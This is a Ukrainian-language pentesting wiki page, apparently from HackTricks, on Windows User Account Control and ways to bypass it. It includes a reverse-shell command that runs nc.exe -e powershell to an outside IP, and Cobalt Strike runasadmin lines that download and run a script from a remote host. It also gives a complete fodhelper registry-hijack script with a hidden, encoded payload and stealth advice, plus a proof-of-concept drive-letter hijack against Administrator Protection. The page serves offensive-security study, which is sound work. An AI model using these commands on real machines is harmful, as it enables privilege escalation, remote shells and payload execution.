# UAC - Контроль облікових записів користувачів

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит згоди для дій з підвищеними привілеями**. У додатків різні `integrity` рівні, і програма з **високим рівнем** може виконувати завдання, які **можуть потенційно скомпрометувати систему**. Коли UAC увімкнено, програми та завдання за замовчуванням **завжди запускаються в контексті безправавого облікового запису** (non-administrator) — якщо адміністратор явним чином не надає цим програмам/завданням доступ на рівні адміністратора. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC увімкнено, користувачу з правами адміністратора видаються 2 токени: стандартний токен користувача для виконання звичайних дій на звичайному рівні, та токен з правами адміністратора.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) розглядає роботу UAC детально та містить інформацію про процес входу, користувацький досвід і архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC на локальному рівні (через secpol.msc) або конфігурувати й поширювати налаштування за допомогою Group Policy Objects (GPO) в середовищі Active Directory. Різні налаштування детально описані [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань Group Policy, які можна задати для UAC. Нижче наведено додаткові подробиці:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Вимкнено                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Вимкнено                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Запит згоди для бінарних файлів, що не належать Windows      |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Запит облікових даних на захищеному робочому столі           |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Увімкнено (за замовчуванням для домашніх версій) Вимкнено (за замовчуванням для корпоративних версій) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Вимкнено                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Увімкнено                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Увімкнено                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Увімкнено                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Увімкнено                                                     |

### UAC Bypass Theory

Деякі програми **автоматично підвищуються (autoelevated)**, якщо **користувач належить** до групи **administrator**. Ці бінарники у своїх _**Manifests**_ мають опцію _**autoElevate**_ зі значенням _**True**_. Також бінарник повинен бути **підписаний Microsoft**.

Багато auto-elevate процесів надають **функціонал через COM-об’єкти або RPC-сервери**, які можуть бути викликані з процесів, що працюють з medium integrity (привілеї звичайного користувача). Зауважте, що COM (Component Object Model) і RPC (Remote Procedure Call) — це методи, які Windows-програми використовують для взаємодії та виконання функцій між різними процесами. Наприклад, **`IFileOperation COM object`** призначений для роботи з файловими операціями (копіювання, видалення, переміщення) і може автоматично підвищувати привілеї без запиту користувача.

Зверніть увагу, що можуть виконуватися додаткові перевірки, наприклад перевірка, чи процес був запущений з каталогу **System32**, яку можна обійти, наприклад, **інжектом у explorer.exe** або інший виконуваний файл, розташований у System32.

Інший спосіб обійти такі перевірки — **змінити PEB**. Кожен процес у Windows має Process Environment Block (PEB), який містить важливі дані про процес, такі як шлях до виконуваного файлу. Модифікуючи PEB, атакувальники можуть підробити (spoof) місцеположення свого шкідливого процесу, зробивши вигляд, ніби він запускається з довіреного каталогу (наприклад system32). Ця підроблена інформація обманює COM-об’єкт і змушує його авто-підвищити привілеї без показу запиту.

Далі, щоб **обійти** UAC (підвищити привілеї з **medium** integrity до **high**), деякі зловмисники використовують такі бінарники для **виконання довільного коду**, оскільки він буде виконаний з процеса **High level integrity**.

Ви можете **перевірити** _**Manifest**_ бінарника за допомогою інструмента _**sigcheck.exe**_ від Sysinternals. (`sigcheck.exe -m <file>`) А також можете **побачити** **integrity level** процесів за допомогою _Process Explorer_ або _Process Monitor_ (від Sysinternals).

### Check UAC

Щоб підтвердити, чи UAC увімкнено, виконайте:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Якщо це **`1`**, то UAC **активовано**, якщо це **`0`** або якщо воно **не існує**, то UAC **неактивний**.

Потім перевірте, **який рівень** налаштовано:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Якщо **`0`**, тоді UAC не запитуватиме (наприклад, **відключено**)
- Якщо **`1`**, адміністратора просять ввести ім'я користувача та пароль для запуску бінарника з підвищеними правами (на Secure Desktop)
- Якщо **`2`** (**Always notify me**), UAC завжди питатиме підтвердження у адміністратора, коли той намагається виконати щось з підвищеними привілеями (на Secure Desktop)
- Якщо **`3`**, як `1`, але не обов'язково на Secure Desktop
- Якщо **`4`**, як `2`, але не обов'язково на Secure Desktop
- Якщо **`5`** (**default**), він попросить адміністратора підтвердити запуск не-Windows бінарників з підвищеними привіlegeями

Потім слід перевірити значення **`LocalAccountTokenFilterPolicy`**\
Якщо значення **`0`**, то лише користувач з **RID 500** (**built-in Administrator**) може виконувати **admin tasks without UAC**, а якщо воно `1`, **усі облікові записи в групі "Administrators"** можуть це робити.

І, нарешті, перевірте значення ключа **`FilterAdministratorToken`**\
Якщо **`0`** (за замовчуванням), **вбудований Administrator** може виконувати віддалені адміністративні завдання, а якщо **`1`**, вбудований обліковий запис Administrator **не може** виконувати віддалені адміністративні завдання, якщо тільки `LocalAccountTokenFilterPolicy` не встановлено в `1`.

#### Підсумок

- Якщо `EnableLUA=0` або **не існує**, **немає UAC для нікого**
- Якщо `EnableLua=1` та **`LocalAccountTokenFilterPolicy=1`**, **немає UAC для нікого**
- Якщо `EnableLua=1` та **`LocalAccountTokenFilterPolicy=0` та `FilterAdministratorToken=0`**, **немає UAC для RID 500 (Built-in Administrator)**
- Якщо `EnableLua=1` та **`LocalAccountTokenFilterPolicy=0` та `FilterAdministratorToken=1`**, **UAC для всіх**

Усю цю інформацію можна зібрати за допомогою модуля metasploit: `post/windows/gather/win_privs`

Також можна перевірити групи вашого користувача та отримати рівень цілісності:
```
net user %username%
whoami /groups | findstr Level
```
## Обхід UAC

> [!TIP]
> Зверніть увагу, якщо у вас є графічний доступ до жертви, обхід UAC простий — ви можете просто натиснути «Так», коли з'явиться запит UAC

Обхід UAC потрібен у наступній ситуації: **UAC активовано, ваш процес працює в контексті medium integrity, і ваш користувач належить до групи administrators**.

Важливо зазначити, що **набагато важче обійти UAC, якщо він встановлений на найвищий рівень безпеки (Always), ніж на будь-який з інших рівнів (Default).**

### UAC вимкнено

Якщо UAC вже вимкнено (`ConsentPromptBehaviorAdmin` є **`0`**) ви можете **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/
- https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html

### **Very** Basic UAC "bypass" (full file system access)

Якщо у вас є shell під користувачем, який входить до групи Administrators, ви можете **змонтувати шар C$** через SMB (file system) локально як новий диск і отримаєте **доступ до всього в межах файлової системи** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Техніки Cobalt Strike працюватимуть тільки якщо UAC не встановлено на максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** та **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) — це **підбірка** кількох UAC bypass exploits. Зверніть увагу, що вам потрібно **compile UACME using visual studio or msbuild**. Компіляція створить кілька виконуваних файлів (наприклад `Source\Akagi\outout\x64\Debug\Akagi.exe`), тож вам потрібно буде знати, який саме файл вам потрібен.\
Вам слід **бути обережними**, бо деякі **bypasses** можуть **викликати інші програми**, які **повідомлятимуть** **користувача**, що щось відбувається.

UACME має **версію збірки, з якої кожна техніка почала працювати**. Ви можете шукати техніку, що впливає на ваші версії:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінарний файл `fodhelper.exe` автоматично підвищується у правах у сучасних версіях Windows. Під час запуску він опитує наведений нижче шлях реєстру для поточного користувача, не перевіряючи дію `DelegateExecute`. Розміщення там команди дозволяє процесу Medium Integrity (користувач у Administrators) створити процес High Integrity без UAC prompt.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell кроки (встановіть свій payload, потім запустіть):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Працює, коли поточний користувач є членом Administrators і рівень UAC встановлений на default/lenient (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative` для запуску 64-bit PowerShell з 32-bit процесу на 64-bit Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шлях до EXE). Уникайте інтерфейсів підтвердження для стелс-режиму.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

Ви можете отримати це, використовуючи сесію **meterpreter**. Мігрируйте в **process**, значення **Session** якого дорівнює **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ повинен працювати)

### UAC Bypass with GUI

Якщо у вас є доступ до **GUI**, ви можете просто прийняти UAC prompt, коли він з’явиться — вам фактично не потрібен обхід. Отже, доступ до GUI дозволить обійти UAC.

Крім того, якщо ви отримаєте GUI-сесію, якою хтось користувався (наприклад via RDP), існують **деякі інструменти, що працюватимуть як administrator**, звідки ви зможете **запустити** наприклад **cmd** **as admin** без повторного запиту UAC, наприклад [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **стелсово**.

### Noisy brute-force UAC bypass

Якщо вам байдуже бути шумним, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **проситиме підвищити права, поки користувач не погодиться**.

### Your own bypass - Basic UAC bypass methodology

Якщо глянути на **UACME**, помітно, що **більшість UAC bypass’ів зловживають Dll Hijacking vulnerabilit**y (в основному записуючи шкідливий dll у _C:\Windows\System32_). [Прочитайте це, щоб дізнатись, як знайти вразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть бінарник, який буде **autoelevate** (перевірте, що при виконанні він працює в high integrity level).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Ймовірно, вам доведеться **записати** DLL у деякі **захищені шляхи** (наприклад C:\Windows\System32), куди у вас немає прав на запис. Ви можете обійти це, використовуючи:
   1. **wusa.exe**: Windows 7,8 та 8.1. Дозволяє розпакувати вміст CAB файлу всередину захищених шляхів (оскільки цей інструмент виконується з high integrity level).
   2. **IFileOperation**: Windows 10.
4. Підготуйте **скрипт** для копіювання вашої DLL у захищений шлях та виконайте вразливий autoelevated бінарник.

### Another UAC bypass technique

Полягає в спостереженні за тим, чи намагається **autoElevated binary** **read** з **registry** ім'я/шлях до **binary** або **command**, який має бути **executed** (це більш цікаво, якщо binary шукає цю інформацію всередині **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” використовує shadow-admin tokens з per-session `\Sessions\0\DosDevices/<LUID>` maps. Директорія створюється ліниво `SeGetTokenDeviceMap` при першому `\??` resolution. Якщо атакуючий наслідує shadow-admin token лише на рівні **SecurityIdentification**, директорія створюється з атакуючим як **owner** (успадковує `CREATOR OWNER`), дозволяючи drive-letter лінки, що мають пріоритет над `\GLOBAL??`.

**Steps:**

1. З низькоправної сесії викличте `RAiProcessRunOnce`, щоб створити promptless shadow-admin `runonce.exe`.
2. Дуплікуйте його primary token у **identification** token і пропарсимуйте його під час відкриття `\??`, щоб змусити створити `\Sessions\0\DosDevices/<LUID>` під власністю атакуючого.
3. Створіть там симлінк `C:`, що вказує на контрольоване атакуючим сховище; наступні файлові доступи в цій сесії резолвляться C: на шлях атакуючого, що дозволяє DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Посилання
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
